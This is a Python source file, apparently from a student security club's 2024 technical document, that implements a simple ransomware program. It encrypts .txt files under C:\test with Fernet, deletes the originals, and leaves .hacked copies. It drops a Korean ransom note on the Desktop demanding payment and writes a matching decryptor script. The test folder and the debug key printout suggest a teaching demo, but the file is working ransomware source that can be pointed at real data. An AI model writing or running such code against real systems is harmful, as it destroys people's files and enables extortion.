import secrets
import base64
import os

try:
    from cryptography.fernet import Fernet #pip install cryptography
except:
    __import__("subprocess").call(['pip','install','cryptography'])
    from cryptography.fernet import Fernet

debug=True

def main():
    encryption_key=generate_encryption_key()
    search_and_encrypt_files(encryption_key)
    create_and_display_ransom_note()
    
    if debug:
        print()
        print(f"생성된 key : {encryption_key.decode()}")
    exit(0)


def generate_encryption_key(length=32):
    """
    @breif : 암호화키를 생성하는 코드
    @param : 암호화키의 길이
    @return : param만큼의 문자열
    """
    secret_token=secrets.token_hex(length)
    byte_secret_token=bytes.fromhex(secret_token)
    encoded_key=base64.urlsafe_b64encode(byte_secret_token)
    
    return encoded_key


def search_and_encrypt_files(key):
    """
    @breif : 시스템 내 파일 탐색 및 암호화 실행
    @param : 생성된 암호화키
    @return : 성공과 실패 여부
    """

    def search_file(directory:str, extension:list):
        """
        @breif : 주어진 디렉토리 내에서 특정 확장자를 가진 모든 파일을 탐색합니다.
        @param directory : 탐색할 디렉토리의 경로
        @param extension : 찾고자 하는 파일의 확장자
        @return : 해당 확장자를 가진 모든 파일의 경로 목록
        """
        files_found = []
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.endswith(extension):
                    files_found.append(os.path.join(root, file))
        return files_found
    
    def encrypt_file(filename):
        """
        @breif : AES256 방식으로 암호화하는 함수
        @param : 파일명
        @return : None
        """
        with open(filename,"rb") as target:
            cipher=Fernet(key)
            with open(filename+".hacked","wb") as locked_file:
                locked_file.write(cipher.encrypt(target.read()))
        os.remove(filename)
        return

    files=search_file("C:\\test",".txt")
    for file in files:
        encrypt_file(file)
        
    return


def create_and_display_ransom_note():
    """
    @breif : 사용자에게 요구사항을 알리는 랜섬노트 생성 및 표시
    @param : None
    @return : None
    """
    def __find_desktop_path__():
        # 바탕화면 경로를 찾는 함수
        home_dir = os.path.expanduser("~")
        desktop_dir = os.path.join(home_dir, 'Desktop')
        return desktop_dir
    
    __desktop_path__=__find_desktop_path__()
    ransom_note=__desktop_path__+"\\Readme.txt"
    decode_tool="DecodeTool.py"
    
    with open(ransom_note,"w+",encoding="utf-8") as f:
        message="""
당신의 컴퓨터는 해킹되었습니다.
keeper14기 강백준,이영재에게 돈을 입금하세요.
2024-01-08 keeper 기술문서"""
        f.write(message)
        f.seek(0,0) # fseek(fp,0,SEEK_SET);
        print(f.read())
        
    with open(decode_tool,"w") as f:
        code="""
from cryptography.fernet import Fernet
import os

def search_file(directory:str, extension:list):
    files_found = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(tuple(extension)):
                files_found.append(os.path.join(root, file))
    return files_found

key = input("Input key\\n\\n").encode()
encrypted_files = search_file('C:\\\\test', ['.hacked'])

cipher = Fernet(key)
for encrypted_file in encrypted_files:
    decrypted_file = encrypted_file.replace('.hacked', '')

    with open(encrypted_file, "rb") as encrypted_target:
        decrypted_data = cipher.decrypt(encrypted_target.read())
        with open(decrypted_file, "wb") as decrypted_file_target:
            decrypted_file_target.write(decrypted_data)
    
    os.remove(encrypted_file)
    print(f"Decoded: {decrypted_file}")

print("Decode process completed.")
        """
        f.write(code)

    return


if __name__ == "__main__":
    main()